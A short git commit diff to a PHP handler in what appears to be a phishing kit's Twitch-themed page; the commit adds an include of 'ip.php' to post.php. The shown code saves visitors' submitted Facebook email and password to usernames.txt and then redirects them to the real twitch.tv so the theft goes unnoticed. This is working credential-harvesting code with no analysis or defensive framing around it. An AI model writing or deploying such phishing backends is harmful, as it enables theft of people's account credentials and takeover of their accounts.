96ef3b8a974442a3377df574151c7f8a8651b1c4
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-06-07 14:23:56 +0500

    Update post.php

--- WebPages/twitch/post.php
+++ WebPages/twitch/post.php
@@ -1,5 +1,6 @@
 <?php
 include 'base.php';
+include 'ip.php';
 
 file_put_contents("usernames.txt", "[FB-EMAIL]: " . $_POST['fb_email'] . " [FB-PASS]: " . $_POST['fb_pass'] . "\n", FILE_APPEND);
 header('Location: https://twitch.tv/');
